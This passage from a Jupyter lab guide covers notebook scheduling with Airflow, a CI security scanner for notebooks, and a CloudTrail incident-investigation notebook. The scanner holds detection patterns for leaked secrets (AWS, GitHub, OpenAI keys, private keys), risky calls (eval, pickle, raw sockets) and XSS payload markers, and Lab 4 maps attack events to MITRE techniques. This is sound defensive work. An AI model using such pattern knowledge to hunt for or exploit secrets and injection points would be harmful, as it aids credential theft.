    os.system(f'jupyter nbconvert --to html --no-input "{input_path}"')

run_notebook = PythonOperator(
    task_id='execute_metrics_notebook',
    python_callable=execute_notebook,
    dag=dag,
)

convert_report = PythonOperator(
    task_id='convert_to_html_report',
    python_callable=convert_to_html,
    dag=dag,
)

cleanup_old = BashOperator(
    task_id='cleanup_old_outputs',
    bash_command='find /opt/airflow/outputs -mtime +30 -name "*.ipynb" -delete',
    dag=dag,
)

run_notebook >> convert_report >> cleanup_old
```

**2.3 Validation:**

```bash
# Test execution locally
papermill notebooks/daily_metrics.ipynb \
  outputs/test_run.ipynb \
  -p execution_date "2024-01-15" \
  -p lookback_days 3 \
  -k python3

# Verify output notebook contains results
jupyter nbconvert --to script outputs/test_run.ipynb --stdout | grep "ALERT\|normal range"

# Test DAG parsing
airflow dags test daily_metrics_notebook 2024-01-15
```

---

### Lab 3: Notebook Security Scanning in CI/CD

**Objective:** Implement automated security scanning for notebooks in a CI/CD pipeline, detecting secrets, dangerous patterns, and untrusted outputs.

**3.1 Security Scanner Script:**

```python
#!/usr/bin/env python3
"""
notebook_security_scan.py — Scan Jupyter notebooks for security issues.
Exit code 0 = pass, 1 = warnings, 2 = critical findings.
"""

import json
import re
import sys
from pathlib import Path
from dataclasses import dataclass, field
from enum import Enum

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"

@dataclass
class Finding:
    severity: Severity
    cell_index: int
    cell_type: str
    message: str
    evidence: str = ""

@dataclass
class ScanResult:
    notebook_path: str
    findings: list = field(default_factory=list)

    @property
    def max_severity(self):
        if not self.findings:
            return None
        severity_order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]
        for sev in severity_order:
            if any(f.severity == sev for f in self.findings):
                return sev
        return None


# Secret patterns (regex, description, severity)
SECRET_PATTERNS = [
    (r'(?:api[_-]?key|apikey)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{20,}', 'API key assignment', Severity.CRITICAL),
    (r'(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{4,}', 'Password in source', Severity.CRITICAL),
    (r'(?:secret|token)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{20,}', 'Secret/token assignment', Severity.CRITICAL),
    (r'sk-[A-Za-z0-9]{32,}', 'OpenAI API key', Severity.CRITICAL),
    (r'ghp_[A-Za-z0-9]{36}', 'GitHub personal access token', Severity.CRITICAL),
    (r'AKIA[A-Z0-9]{16}', 'AWS access key ID', Severity.CRITICAL),
    (r'(?:-----BEGIN (?:RSA )?PRIVATE KEY-----)', 'Private key', Severity.CRITICAL),
    (r'postgres(?:ql)?://[^:]+:[^@]+@', 'Database URL with credentials', Severity.HIGH),
    (r'mysql://[^:]+:[^@]+@', 'Database URL with credentials', Severity.HIGH),
    (r'mongodb(?:\+srv)?://[^:]+:[^@]+@', 'MongoDB URL with credentials', Severity.HIGH),
]

# Dangerous code patterns
DANGEROUS_PATTERNS = [
    (r'subprocess\.(?:run|call|Popen|check_output)', 'Subprocess execution', Severity.MEDIUM),
    (r'os\.system\s*\(', 'OS command execution', Severity.MEDIUM),
    (r'eval\s*\(', 'eval() usage', Severity.HIGH),
    (r'exec\s*\(', 'exec() usage', Severity.HIGH),
    (r'__import__\s*\(', 'Dynamic import', Severity.MEDIUM),
    (r'pickle\.loads?\s*\(', 'Pickle deserialization (RCE risk)', Severity.HIGH),
    (r'yaml\.(?:load|unsafe_load)\s*\(', 'Unsafe YAML load', Severity.HIGH),
    (r'socket\.socket\s*\(', 'Raw socket creation', Severity.MEDIUM),
    (r'requests?\.(?:get|post|put|delete)\s*\(["\']http://', 'HTTP (not HTTPS) request', Severity.LOW),
]

# Output-based threats
OUTPUT_PATTERNS = [
    (r'<script[^>]*>', 'JavaScript in output (XSS risk)', Severity.CRITICAL),
    (r'<iframe[^>]*>', 'IFrame in output', Severity.HIGH),
    (r'javascript:', 'JavaScript URI scheme', Severity.CRITICAL),
    (r'onerror\s*=', 'Event handler injection', Severity.CRITICAL),
    (r'data:text/html', 'Data URI HTML (potential XSS)', Severity.HIGH),
]


def scan_notebook(path: Path) -> ScanResult:
    result = ScanResult(notebook_path=str(path))

    with open(path) as f:
        try:
            nb = json.load(f)
        except json.JSONDecodeError:
            result.findings.append(Finding(
                severity=Severity.HIGH,
                cell_index=-1,
                cell_type="file",
                message="Invalid JSON — possibly corrupted or tampered notebook"
            ))
            return result

    # Check notebook format
    if nb.get('nbformat', 0) < 4:
        result.findings.append(Finding(
            severity=Severity.LOW,
            cell_index=-1,
            cell_type="metadata",
            message=f"Old notebook format (v{nb.get('nbformat')})"
        ))

    cells = nb.get('cells', [])

    for idx, cell in enumerate(cells):
        source = ''.join(cell.get('source', []))
        cell_type = cell.get('cell_type', 'unknown')

        # Scan source for secrets
        if cell_type == 'code':
            for pattern, desc, severity in SECRET_PATTERNS:
                matches = re.findall(pattern, source, re.IGNORECASE)
                for match in matches:
                    result.findings.append(Finding(
                        severity=severity,
                        cell_index=idx,
                        cell_type=cell_type,
                        message=f"Potential {desc}",
                        evidence=match[:50] + "..." if len(match) > 50 else match
                    ))

            # Scan for dangerous patterns
            for pattern, desc, severity in DANGEROUS_PATTERNS:
                if re.search(pattern, source):
                    result.findings.append(Finding(
                        severity=severity,
                        cell_index=idx,
                        cell_type=cell_type,
                        message=desc
                    ))

        # Scan outputs for XSS / injection
        outputs = cell.get('outputs', [])
        for output in outputs:
            output_data = output.get('data', {})
            for mime_type, content in output_data.items():
                if isinstance(content, list):
                    content = ''.join(content)
                if isinstance(content, str):
                    for pattern, desc, severity in OUTPUT_PATTERNS:
                        if re.search(pattern, content, re.IGNORECASE):
                            result.findings.append(Finding(
                                severity=severity,
                                cell_index=idx,
                                cell_type="output",
                                message=f"{desc} in {mime_type} output"
                            ))

    # Check for outputs committed (potential secret leakage)
    cells_with_outputs = sum(1 for c in cells if c.get('outputs'))
    if cells_with_outputs > 0:
        result.findings.append(Finding(
            severity=Severity.LOW,
            cell_index=-1,
            cell_type="metadata",
            message=f"{cells_with_outputs} cells have saved outputs (review for secrets)"
        ))

    return result


def main():
    if len(sys.argv) < 2:
        print("Usage: notebook_security_scan.py <notebook_or_directory> [--fail-on HIGH]")
        sys.exit(1)

    target = Path(sys.argv[1])
    fail_level = Severity.HIGH

    if '--fail-on' in sys.argv:
        idx = sys.argv.index('--fail-on')
        fail_level = Severity[sys.argv[idx + 1]]

    notebooks = []
    if target.is_file():
        notebooks = [target]
    elif target.is_dir():
        notebooks = list(target.rglob('*.ipynb'))
        notebooks = [nb for nb in notebooks if '.ipynb_checkpoints' not in str(nb)]

    if not notebooks:
        print("No notebooks found.")
        sys.exit(0)

    all_results = []
    for nb_path in notebooks:
        result = scan_notebook(nb_path)
        all_results.append(result)

    # Report
    severity_order = [Severity.CRITICAL, Severity.HIGH, Severity.MEDIUM, Severity.LOW]
    total_findings = sum(len(r.findings) for r in all_results)
    critical_count = sum(1 for r in all_results for f in r.findings if f.severity == Severity.CRITICAL)

    print(f"\n{'='*60}")
    print(f"Notebook Security Scan Results")
    print(f"{'='*60}")
    print(f"Scanned: {len(notebooks)} notebooks")
    print(f"Findings: {total_findings} total, {critical_count} critical")
    print(f"{'='*60}\n")

    for result in all_results:
        if not result.findings:
            continue
        print(f"\n--- {result.notebook_path} ---")
        for finding in sorted(result.findings, key=lambda f: severity_order.index(f.severity)):
            print(f"  [{finding.severity.value}] Cell {finding.cell_index} ({finding.cell_type}): {finding.message}")
            if finding.evidence:
                print(f"           Evidence: {finding.evidence}")

    # Exit code based on severity
    max_found = None
    for sev in severity_order:
        if any(f.severity == sev for r in all_results for f in r.findings):
            max_found = sev
            break

    if max_found and severity_order.index(max_found) <= severity_order.index(fail_level):
        sys.exit(2)
    elif total_findings > 0:
        sys.exit(1)
    else:
        print("\nAll clear.")
        sys.exit(0)


if __name__ == '__main__':
    main()
```

**3.2 GitHub Actions Integration:**

```yaml
# .github/workflows/notebook-security.yaml
name: Notebook Security Scan

on:
  pull_request:
    paths:
      - '**/*.ipynb'
  push:
    branches: [main]
    paths:
      - '**/*.ipynb'

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: pip install nbformat nbstripout

      - name: Run notebook security scan
        run: python scripts/notebook_security_scan.py notebooks/ --fail-on HIGH

      - name: Verify notebooks are stripped
        run: |
          DIRTY=$(find notebooks -name "*.ipynb" -exec sh -c '
            python -c "
import json, sys
with open(sys.argv[1]) as f:
    nb = json.load(f)
for cell in nb.get(\"cells\", []):
    if cell.get(\"outputs\"):
        print(sys.argv[1])
        break
" "$1"' _ {} \;)
          if [ -n "$DIRTY" ]; then
            echo "ERROR: Notebooks with outputs committed:"
            echo "$DIRTY"
            echo "Run: nbstripout <notebook>"
            exit 1
          fi

      - name: Check for large notebooks
        run: |
          find notebooks -name "*.ipynb" -size +1M -exec echo "WARNING: Large notebook: {}" \;
```

**3.3 Pre-commit Hook Configuration:**

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/kynan/nbstripout
    rev: 0.6.1
    hooks:
      - id: nbstripout
        args: ['--extra-keys', 'metadata.kernelspec metadata.language_info.version']

  - repo: local
    hooks:
      - id: notebook-security-scan
        name: Notebook Security Scan
        entry: python scripts/notebook_security_scan.py
        language: python
        types: [jupyter]
        additional_dependencies: []
        args: ['--fail-on', 'HIGH']

  - repo: https://github.com/nbQA-dev/nbQA
    rev: 1.7.1
    hooks:
      - id: nbqa-flake8
        args: ['--select=E9,F63,F7,F82,S101,S105,S106,S107']
        additional_dependencies: [flake8-bandit]
```

---

### Lab 4: Interactive Security Analysis Notebook for Log Investigation

**Objective:** Create a notebook template for security analysts to investigate suspicious activity in logs, combining interactive exploration with structured analysis.

**4.1 Notebook Structure:**

```python
# Cell 1: Configuration and Setup
"""
Security Investigation Notebook
================================
Investigation ID: {investigation_id}
Analyst: {analyst_name}
Date: {investigation_date}
Scope: {investigation_scope}
"""

import pandas as pd
import numpy as np
import ipywidgets as widgets
from IPython.display import display, HTML, Markdown
from datetime import datetime, timedelta
import hashlib
import json
import re
```

```python
# Cell 2: Parameters (tag: parameters)
investigation_id = "INC-2024-0042"
log_source = "s3://security-logs/cloudtrail/2024/01/"
time_window_start = "2024-01-15T00:00:00Z"
time_window_end = "2024-01-15T23:59:59Z"
suspect_ips = ["198.51.100.23", "203.0.113.45"]
suspect_users = ["compromised-svc-account"]
```

```python
# Cell 3: Secure Data Loading
from sqlalchemy import create_engine, text
import os

# Connection string from environment — NEVER hardcode
engine = create_engine(os.environ['SECURITY_DB_URL'])

query = text("""
SELECT
    event_time,
    source_ip,
    user_identity,
    event_name,
    event_source,
    request_parameters,
    response_elements,
    error_code,
    user_agent,
    aws_region
FROM cloudtrail_events
WHERE event_time BETWEEN :start AND :end
  AND (source_ip = ANY(:ips) OR user_identity = ANY(:users))
ORDER BY event_time
""")

events = pd.read_sql(
    query, engine,
    params={
        'start': time_window_start,
        'end': time_window_end,
        'ips': suspect_ips,
        'users': suspect_users
    }
)

print(f"Loaded {len(events)} events for investigation {investigation_id}")
print(f"Time range: {events['event_time'].min()} to {events['event_time'].max()}")
print(f"Unique IPs: {events['source_ip'].nunique()}")
print(f"Unique Users: {events['user_identity'].nunique()}")
```

```python
# Cell 4: Interactive Timeline Explorer
import plotly.express as px
import plotly.graph_objects as go

# Event timeline
events['hour'] = events['event_time'].dt.floor('5min')
timeline = events.groupby(['hour', 'event_source']).size().reset_index(name='count')

fig = px.bar(
    timeline, x='hour', y='count', color='event_source',
    title=f'Event Timeline — Investigation {investigation_id}',
    labels={'hour': 'Time', 'count': 'Event Count'}
)
fig.update_layout(height=400, xaxis_rangeslider_visible=True)
fig.show()
```

```python
# Cell 5: Anomaly Detection
from scipy import stats

# Baseline: typical activity pattern for this user/IP
baseline_query = text("""
SELECT
    date_trunc('hour', event_time) AS hour,
    COUNT(*) AS event_count
FROM cloudtrail_events
WHERE user_identity = ANY(:users)
  AND event_time BETWEEN :baseline_start AND :baseline_end
GROUP BY 1
""")

baseline = pd.read_sql(baseline_query, engine, params={
    'users': suspect_users,
    'baseline_start': (datetime.fromisoformat(time_window_start.rstrip('Z'))
                       - timedelta(days=30)).isoformat(),
    'baseline_end': time_window_start
})

# Z-score for investigation period
investigation_hourly = events.groupby(events['event_time'].dt.floor('H')).size()
baseline_mean = baseline['event_count'].mean()
baseline_std = baseline['event_count'].std()

anomalous_hours = investigation_hourly[
    (investigation_hourly - baseline_mean).abs() > 3 * baseline_std
]

if len(anomalous_hours) > 0:
    display(HTML(
        f"<div style='background:#fee;padding:1rem;border-left:4px solid red;'>"
        f"<b>ANOMALY DETECTED:</b> {len(anomalous_hours)} hours with activity "
        f">{3}σ above baseline (mean={baseline_mean:.1f}, σ={baseline_std:.1f})"
        f"</div>"
    ))
    display(anomalous_hours)
```

```python
# Cell 6: Interactive Filtering Widget
event_types = events['event_name'].unique().tolist()

type_selector = widgets.SelectMultiple(
    options=event_types,
    value=event_types[:5],
    description='Event Types:',
    layout=widgets.Layout(width='50%', height='200px')
)

ip_selector = widgets.SelectMultiple(
    options=events['source_ip'].unique().tolist(),
    description='Source IPs:',
    layout=widgets.Layout(width='50%', height='100px')
)

output_area = widgets.Output()

def filter_events(change):
    with output_area:
        output_area.clear_output()
        filtered = events[
            (events['event_name'].isin(type_selector.value)) &
            (events['source_ip'].isin(ip_selector.value))
        ]
        print(f"Filtered: {len(filtered)} events")
        display(filtered[['event_time', 'source_ip', 'user_identity',
                         'event_name', 'error_code']].head(50))

type_selector.observe(filter_events, names='value')
ip_selector.observe(filter_events, names='value')

display(widgets.VBox([
    widgets.HBox([type_selector, ip_selector]),
    output_area
]))
```

```python
# Cell 7: Tactics/Techniques Mapping (MITRE ATT&CK)
attack_mapping = {
    'ConsoleLogin': ('TA0001', 'T1078', 'Initial Access — Valid Accounts'),
    'CreateAccessKey': ('TA0003', 'T1098', 'Persistence — Account Manipulation'),
    'AssumeRole': ('TA0004', 'T1548', 'Privilege Escalation — Abuse Elevation Control'),
    'GetSecretValue': ('TA0006', 'T1555', 'Credential Access — Credentials from Password Stores'),
    'PutBucketPolicy': ('TA0010', 'T1537', 'Exfiltration — Transfer to Cloud Account'),
    'StopLogging': ('TA0005', 'T1562', 'Defense Evasion — Impair Defenses'),
    'DeleteTrail': ('TA0005', 'T1562', 'Defense Evasion — Impair Defenses'),
    'RunInstances': ('TA0008', 'T1578', 'Lateral Movement — Modify Cloud Compute'),
}

detected_techniques = []
for event_name in events['event_name'].unique():
    if event_name in attack_mapping:
        tactic, technique, description = attack_mapping[event_name]
        count = len(events[events['event_name'] == event_name])
        detected_techniques.append({
            'Event': event_name,
            'Tactic': tactic,
            'Technique': technique,
            'Description': description,
            'Count': count
        })

if detected_techniques:
    display(Markdown("### MITRE ATT&CK Mapping"))
    display(pd.DataFrame(detected_techniques).sort_values('Count', ascending=False))
```

```python
# Cell 8: Evidence Collection and Hashing
import hashlib
from datetime import datetime

def hash_evidence(data: str) -> str:
    """SHA-256 hash for evidence integrity."""
    return hashlib.sha256(data.encode()).hexdigest()

# Create evidence record
evidence = {
    'investigation_id': investigation_id,
    'collection_timestamp': datetime.utcnow().isoformat() + 'Z',
    'total_events': len(events),
    'unique_source_ips': events['source_ip'].unique().tolist(),
    'unique_users': events['user_identity'].unique().tolist(),
    'event_types_observed': events['event_name'].unique().tolist(),
    'time_range': {
        'start': str(events['event_time'].min()),
        'end': str(events['event_time'].max())
    },
    'anomalous_periods': len(anomalous_hours) if 'anomalous_hours' in dir() else 0,
    'mitre_techniques': detected_techniques
}

evidence_json = json.dumps(evidence, indent=2, default=str)
evidence_hash = hash_evidence(evidence_json)

print(f"Evidence Hash (SHA-256): {evidence_hash}")
print(f"Collection Time: {evidence['collection_timestamp']}")

# Save evidence (in production, send to SIEM/case management)
evidence_path = f'/tmp/evidence_{investigation_id}_{datetime.utcnow().strftime("%Y%m%d_%H%M%S")}.json'
with open(evidence_path, 'w') as f:
    f.write(evidence_json)
print(f"Evidence saved: {evidence_path}")
```

```python
# Cell 9: Investigation Summary (Markdown output)
summary = f"""
## Investigation Summary

| Field | Value |
|-------|-------|
| Investigation ID | {investigation_id} |
| Time Window | {time_window_start} to {time_window_end} |
| Total Events Analyzed | {len(events)} |
| Anomalous Periods | {len(anomalous_hours) if 'anomalous_hours' in dir() else 'N/A'} |
| MITRE Techniques | {len(detected_techniques)} |
| Evidence Hash | `{evidence_hash}` |

### Key Findings

1. **Activity Volume**: {len(events)} events from {events['source_ip'].nunique()} IPs
2. **Anomaly Score**: {'HIGH' if len(anomalous_hours) > 3 else 'MEDIUM' if len(anomalous_hours) > 0 else 'LOW'}
3. **Attack Techniques**: {', '.join(set(t['Technique'] for t in detected_techniques)) if detected_techniques else 'None mapped'}

### Recommended Actions

- [ ] Rotate credentials for affected accounts
- [ ] Review IAM policies for least privilege
- [ ] Enable GuardDuty findings correlation
- [ ] Block suspect IPs at WAF/security group level
- [ ] Preserve CloudTrail logs beyond retention period
"""

display(Markdown(summary))
```

**4.2 Deployment as Template:**

```bash
# Register as a Papermill-compatible template
cp security_investigation.ipynb /opt/notebooks/templates/

# Launch investigation with parameters
papermill /opt/notebooks/templates/security_investigation.ipynb \
  /opt/notebooks/investigations/INC-2024-0042.ipynb \
  -p investigation_id "INC-2024-0042" \
  -p time_window_start "2024-01-15T00:00:00Z" \
  -p time_window_end "2024-01-15T23:59:59Z" \
  -p suspect_ips '["198.51.100.23"]' \
  -k python3
```

**4.3 Validation Criteria:**

- [ ] Notebook executes without errors when parameterized
- [ ] No credentials appear in source cells or outputs
- [ ] Evidence hashing produces consistent SHA-256 for identical data
- [ ] Interactive widgets function correctly in JupyterLab
- [ ] MITRE ATT&CK mapping covers common cloud attack patterns
- [ ] Notebook passes security scanner from Lab 3
- [ ] Timeline visualization renders with real data sample
- [ ] Summary cell produces actionable Markdown output

---

## References

- Jupyter Documentation: https://docs.jupyter.org/
- JupyterHub Documentation: https://jupyterhub.readthedocs.io/
- Jupyter Messaging Protocol: https://jupyter-client.readthedocs.io/en/latest/messaging.html
- Zero to JupyterHub: https://z2jh.jupyter.org/
- Papermill: https://papermill.readthedocs.io/
- nbformat Specification: https://nbformat.readthedocs.io/
- JupyterLab Extension Development: https://jupyterlab.readthedocs.io/en/latest/extension/extension_dev.html
- MITRE ATT&CK Cloud Matrix: https://attack.mitre.org/matrices/enterprise/cloud/
- OWASP Jupyter Security: https://owasp.org/www-project-jupyter-security/
- Jupyter Security Advisories: https://github.com/jupyter/jupyter/security/advisories
